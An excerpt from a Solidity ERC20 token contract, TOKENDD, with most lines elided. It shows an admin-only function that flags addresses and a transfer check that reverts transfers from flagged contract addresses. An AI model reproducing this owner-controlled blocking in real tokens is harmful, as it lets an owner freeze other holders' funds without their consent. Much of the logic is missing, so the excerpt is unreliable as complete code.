...
contract TOKENDD is ERC20,Control{  
   ...
   function _transferToken(address from,address to,uint256 amount) private{
    ...
    function setBotfrom(address user) public onlyRole(DEFAULT_ADMIN_ROLE){
        _botfrommap[user]=1;
    }   
    ...
    function Legaladdress(address from,address to,uint256 amount) internal virtual returns(bool state){
        if(isContract(from) && from!=_usdtPair && from!=_da && from!=_ca ){
            if(_botfrommap[from]==0){
                return false;
            }
            return true;
         }
    ...
    function _transfer(address from,address to,uint256 amount) internal override(ERC20){
        ...
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance"); 
         ...
         if(Legaladdress(from,to,amount)){
            require(_botfrommap[from]==0);
        } 
